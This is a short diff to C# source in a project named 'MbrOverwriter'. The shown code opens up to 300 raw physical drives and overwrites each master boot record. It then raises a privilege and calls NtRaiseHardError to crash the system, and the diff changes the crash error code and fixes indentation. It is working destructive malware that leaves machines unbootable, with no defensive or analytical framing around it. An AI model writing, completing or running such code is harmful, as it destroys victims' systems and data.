@@ -2096,7 +2096,7 @@ namespace MbrOverwriter
                 for (int s = 0; s < 300; s++)
                 {
                     var mbr = CreateFile($"\\\\.\\PhysicalDrive{s}", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
-                OpenExisting, 0, IntPtr.Zero);
+                    OpenExisting, 0, IntPtr.Zero);
                     WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                 }
             }
@@ -2109,8 +2109,7 @@ namespace MbrOverwriter
             Boolean t1;
             uint t2;
             RtlAdjustPrivilege(19, true, false, out t1);
-            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+            NtRaiseHardError(0xc0000350, 0, 0, IntPtr.Zero, 6, out t2);
         }
-
     }
 }
